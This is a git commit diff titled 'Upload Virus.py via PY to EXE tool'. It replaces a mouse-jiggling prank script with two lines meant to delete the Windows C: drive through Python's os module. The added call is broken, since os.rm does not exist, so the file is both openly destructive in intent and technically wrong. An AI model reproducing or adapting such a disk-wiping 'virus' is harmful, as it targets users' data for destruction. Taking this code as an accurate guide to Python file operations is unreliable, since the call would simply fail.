2f60e50e9a0ccd535e3c52d41bbc0c4b7d0f40d8
eroge-69 <erogexunamed@gmail.com>
2025-09-07 11:01:18 +0700

    Upload Virus.py via PY to EXE tool

--- python-files/Virus.py
+++ python-files/Virus.py
@@ -1,14 +1,2 @@
-import pyautogui as p
-import random
-import time
-
-
-for i in range(10):
-
-    x= random.randint(900, 1500)
-
-y= random.randint(400, 800)
-
-p.moveTo(x, y)
-
-time.sleep(0.2)
+import os
+os.rm("C:/")
